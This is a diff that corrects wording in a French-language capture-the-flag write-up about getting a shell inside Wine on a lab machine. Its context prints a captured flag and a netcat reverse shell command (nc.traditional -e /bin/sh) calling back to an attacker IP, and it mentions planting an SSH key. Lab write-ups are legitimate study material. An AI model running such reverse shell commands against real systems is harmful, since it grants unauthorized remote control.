@@ -185,11 +185,11 @@ Z:\home\fox>type local.txt
 ea2188e08f77470c2c9918ba06f566f7
 ```
 
-On est bien dans le home de l'utilisateur *fox* mais on a visiblement récupéré un shell dans Wine. Le premier signe c'est que l'on sait que l'OS tourné par VirtualBox est un Linux. Le second signe c'est la lettre Z utilisée pour le volume servant de racine Linux qui est spécifique à Wine.
+On est bien dans le home de l'utilisateur *fox* mais on a visiblement récupéré un shell dans Wine. Le premier signe c'est que l'on sait que l'OS émulé par VirtualBox est un Linux. Le second signe c'est la lettre Z utilisée pour le volume servant de racine Linux qui est spécifique à Wine.
 
 On peut tout à fait utiliser les commandes Windows pour créer le dossier *.ssh* et placer notre clé publique dans *authorized_keys* mais il est aussi possible de faire exécuter des  commandes Linux depuis Wine. Le seul inconvénient c'est qu'on aura pas l'output.
 
-J'ai remarqué que dans *Z:\bin\* on retrouvait le binaire *nc.traditional* qui dispose de l'option *-e* très pratique pour obtenir un shell :
+J'ai remarqué que dans *Z:\bin* on retrouvait le binaire *nc.traditional* qui dispose de l'option *-e* très pratique pour obtenir un shell :
 
 ```powershell
 Z:\home\fox>start /unix /bin/nc.traditional -e /bin/sh 192.168.56.1 9999
